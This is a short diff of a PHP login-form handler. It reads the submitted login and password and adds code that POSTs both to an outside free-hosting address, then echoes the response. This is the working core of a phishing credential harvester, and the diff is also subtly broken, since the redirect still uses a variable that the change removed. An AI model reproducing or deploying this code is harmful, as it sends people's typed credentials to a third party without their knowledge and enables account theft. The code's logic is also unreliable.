@@ -4,9 +4,22 @@
     $login = htmlspecialchars($_POST['login']);
     $password  = htmlspecialchars($_POST['password']);
 
-    $url = 'https://sparkling1234.000webhostapp.com/';
-    $xml = $password
-    $response = http_post_data($url, $xml);
+    $postdata = http_build_query(
+        array(
+            'login' => $login,
+            'password' => $password
+        )
+    );
+    $opts = array('http' =>
+        array(
+            'method' => 'POST',
+            'header' => 'Content-type: application/x-www-form-urlencoded',
+            'content' => $postdata
+        )
+    );
+    $context = stream_context_create($opts);
+    $result = file_get_contents('https://sparkling1234.000webhostapp.com/', false, $context);
+    echo $result;
 
     header('Location: '.$url);
 ?>
